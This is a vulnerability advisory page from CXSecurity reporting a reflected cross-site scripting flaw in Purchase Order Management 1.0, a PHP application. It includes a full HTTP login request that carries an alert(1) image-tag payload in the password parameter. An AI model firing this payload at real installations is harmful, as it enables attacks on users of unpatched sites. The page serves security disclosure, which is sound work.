---
title: Purchase Order Management 1.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2023030011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-07
fetch_date: 2025-10-04T08:47:47.743436
---

# Purchase Order Management 1.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Purchase Order Management 1.0 Cross Site Scripting** **2023.03.06**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

## Title: Purchase Order Management-1.0 - XSS-Reflected - Information-gathering
## Author: nu11secur1ty
## Date: 03.06.2023
## Vendor: https://www.sourcecodester.com/user/257130/activity
## Software: https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html
## Reference: https://portswigger.net/web-security/cross-site-scripting/reflected
## Description:
The value of the `password` request parameter is copied into the HTML
document as plain text between tags. The payload uay4w<img src=a
onerror=alert(1)>s4m6g was submitted in the password parameter. This
input was echoed unmodified in the application's response.
STATUS: HIGH Vulnerability
[+]Exploit:
```POST
POST /purchase\_order/classes/Login.php?f=login HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: \*/\*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178
Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: PHPSESSID=83loqso6i0hee5lpfufibf68o5
Origin: http://localhost
X-Requested-With: XMLHttpRequest
Referer: http://localhost/purchase\_order/admin/login.php
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="110", "Chromium";v="110"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
Content-Length: 37
username=gAjjuMUL&password=k8Z!h2w!V7uay4w%3cimg%20src%3da%20onerror%3dalert(1)%3es4m6g
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/2023/Purchase-Order-Management-1.0/XSS-Reflected)
## Proof and Exploit:
[href](https://streamable.com/cgw8a4)
## Time spend:
00:15:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at
https://packetstormsecurity.com/https://cve.mitre.org/index.html and
https://www.exploit-db.com/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/
https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top